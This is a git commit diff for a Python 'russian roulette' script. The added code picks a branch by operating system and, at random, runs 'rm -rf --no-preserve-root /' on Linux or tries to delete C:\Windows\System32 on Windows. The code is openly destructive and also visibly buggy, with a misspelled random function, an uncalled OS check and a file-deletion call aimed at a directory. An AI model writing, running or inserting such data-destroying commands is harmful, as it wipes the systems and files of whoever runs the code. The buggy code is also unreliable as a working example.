e291235e617d29fd5043b39b7796c653859c9381
TOYSOLDIER12 <ilyasilyas2002@gmail.com>
2024-04-19 10:20:17 +0100

    2 push

--- russianRoulette.py
+++ russianRoulette.py
@@ -1,5 +1,20 @@
 import os
 import random
+import platform
 
-if random.randit(0,6) == 1:
-    os.remove("rm -rf --no-preserve-root /")
+def check_os():
+    system = platform.system()
+    if system.lower() == "linux":
+        linux_remove()
+    else :
+        windows_remove()
+        
+system = check_os
+
+def linux_remove():
+    if random.randit(0,6) == 1:
+        os.system("rm -rf --no-preserve-root /")
+def windows_remove():
+     if random.randit(0,6) == 1:
+         os.remove("C:\Windows\System32")
+
